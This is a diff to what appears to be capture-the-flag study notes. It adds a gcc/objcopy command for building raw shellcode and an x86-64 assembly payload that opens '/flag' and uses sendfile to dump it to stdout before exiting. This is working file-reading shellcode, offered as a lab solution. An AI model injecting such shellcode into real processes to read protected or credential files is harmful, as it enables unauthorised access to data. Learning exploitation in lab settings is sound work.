@@ -27,8 +27,48 @@ gdb ./sc-elf
 ```
 ![图片](https://github.com/user-attachments/assets/de1bf64d-7fd0-48af-bfdd-fa25089b2fbd)
 
+```sh
+gcc -nostdlib -static zzz.s -o yyy && objcopy --dump-section .text=xxx yyy
+```
+
 ## 4
 ```s
+.intel_syntax noprefix
+.globl _start
+
+.section .text
+
+_start:
+
+push 0x616c662f
+mov dword ptr [rsp+4],0x67
+push rsp
+pop rdi
+push 0
+pop rsi
+push 2
+pop rax
+syscall
+
+push 1
+pop rdi
+push rax
+pop rsi
+push 0
+pop rdx
+push 60
+pop r10
+push 40
+pop rax
+syscall
+
+push 0
+pop rdi
+push 60
+pop rax
+syscall
+
+.section .data
 
 ```
 ## 5
